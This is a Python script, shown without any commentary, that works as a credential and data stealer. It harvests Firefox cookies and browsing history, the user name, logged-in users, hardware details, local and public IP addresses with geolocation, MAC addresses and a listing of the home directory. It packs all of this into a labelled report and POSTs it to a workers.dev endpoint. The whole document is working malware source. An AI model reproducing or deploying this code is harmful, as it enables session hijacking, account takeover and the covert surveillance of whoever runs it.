```python	
import os
import sys
import json
import socket
import psutil
import pathlib
import getpass
import platform
import datetime
import requests
import sqlite_utils
home = pathlib.Path.home()
def get_moz():
	p = pathlib.Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox"
	t = ["cookies.sqlite", "places.sqlite"]
	c = []
	u = []
	if p.exists and p.is_dir():
		for d in p.rglob("*"):
			if d.is_file() and d.name == "cookies.sqlite":
				db = sqlite_utils.Database(d)
				co = db['moz_cookies']
				for r in co.rows:
					c.append(r)
			elif d.is_file() and d.name == "places.sqlite":
				db = sqlite_utils.Database(d)
				co = db['moz_places']
				for r in co.rows:
					u.append(r['url'])
		return c, u
	return None, None
				
def format1(s, path=False):
	if not path:
		return str(s).replace("[","").replace("]","")
	return str(s).replace("[","").replace("]","").replace(",","\r\n").replace("'","")
		
def run_paths():
	f = []
	d = []
	for p in home.glob("*"):
		if p.is_dir():
			d.append(str(p))
		elif p.is_file():
			f.append(str(p))
	return d, f
	
def get_ip():
    try:
        ipv4 = []
        ipv6 = []
        mac = []
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ipv4.append(addr.address)
                elif addr.family == socket.AF_INET6:
                    ipv6.append(addr.address)
                elif addr.family in (psutil.AF_LINK, getattr(socket, "AF_PACKET", None)):
                    mac.append(addr.address)
        return ipv4, ipv6, mac
    except Exception as e:
        return str(e)
        
def public_ip():
	req = requests.get("https://api64.ipify.org/")
	if req.status_code == 200:
		return req.text
	else:
		return req.status_code
		
def ip_info():
	r = requests.get("http://ip-api.com/json/")
	if r.status_code == 200:
		j = json.loads(r.text)
		return j
	return None
	
def logged():
	u = []
	for it in psutil.users():
		u.append(it.name)
	return u

user = getpass.getuser()
exe = pathlib.Path(sys.executable).name
pts = run_paths()
time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
i = get_ip()
i_info = ip_info()
lo = format1(logged())
cc = psutil.cpu_count()
cf = psutil.cpu_freq().current
ram = psutil.virtual_memory().total // 1024 // 1024
i4 = format1(i[0])
i6 = format1(i[1])
mc = format1(i[2])
sy = platform.system()
nd = platform.node()
re = platform.release()
d_path = format1(pts[0], path=True)
f_path = format1(pts[1], path=True)
f_co = get_moz()
cookies = format1(f_co[0])
places = format1(f_co[1], path=True)

payload = b"\n---------- \xf0\x9d\x90\x94\xf0\x9d\x90\x92\xf0\x9d\x90\x84\xf0\x9d\x90\x91 \xf0\x9d\x90\x83\xf0\x9d\x90\x80\xf0\x9d\x90\x93\xf0\x9d\x90\x80 ----------\n\nExecution time: {time}\n\nUser: {user}\n\nLogged Users: {lo}\n\nCPU: {cc}\n\nCPU Frequency: {cf}\n\nRAM: {ram}MB\n\nPublic IP: {public_ip()}\n\nCountry: {i_info['country']}\n\nRegion: {i_info['regionName']}\n\nCity: {i_info['city']}\n\nISP: {i_info['isp']}\n\nOrganization: {i_info['org']}\n\nAlias: {i_info['as']}\n\nIPv4: {i4}\n\nIPv6: {i6}\n\nMAC: {mc}\n\nSystem: {sy}\n\nNode: {nd}\n\nVersion: {re}\n\nGoogle Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}\n\n-------- \xf0\x9d\x90\x85\xf0\x9d\x90\xa2\xf0\x9d\x90\xa5\xf0\x9d\x90\x9e\xf0\x9d\x90\xac \xf0\x9d\x90\x80\xf0\x9d\x90\xa7\xf0\x9d\x90\x9d \xf0\x9d\x90\x83\xf0\x9d\x90\xa2\xf0\x9d\x90\xab\xf0\x9d\x90\x9e\xf0\x9d\x90\x9c\xf0\x9d\x90\xad\xf0\x9d\x90\xa8\xf0\x9d\x90\xab\xf0\x9d\x90\xa2\xf0\x9d\x90\x9e\xf0\x9d\x90\xac ---------\n\n{d_path}\n\n{f_path}\n\n--------------- \xf0\x9d\x90\x82\xf0\x9d\x90\xa8\xf0\x9d\x90\xa8\xf0\x9d\x90\xa4\xf0\x9d\x90\xa2\xf0\x9d\x90\x9e\xf0\x9d\x90\xac ----------------\n\n{cookies}\n\n----------- \xf0\x9d\x90\x85\xf0\x9d\x90\xa2\xf0\x9d\x90\xab\xf0\x9d\x90\x9e\xf0\x9d\x90\x9f\xf0\x9d\x90\xa8\xf0\x9d\x90\xb1 \xf0\x9d\x90\x87\xf0\x9d\x90\xa2\xf0\x9d\x90\xac\xf0\x9d\x90\xad\xf0\x9d\x90\xa8\xf0\x9d\x90\xab\xf0\x9d\x90\xb2 ------------\n\n{places}\n\n----------------------------------------\n"
content = json.dumps({"msg": payload.decode()})
r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
if r.status_code == 200:
	print("yes")
```
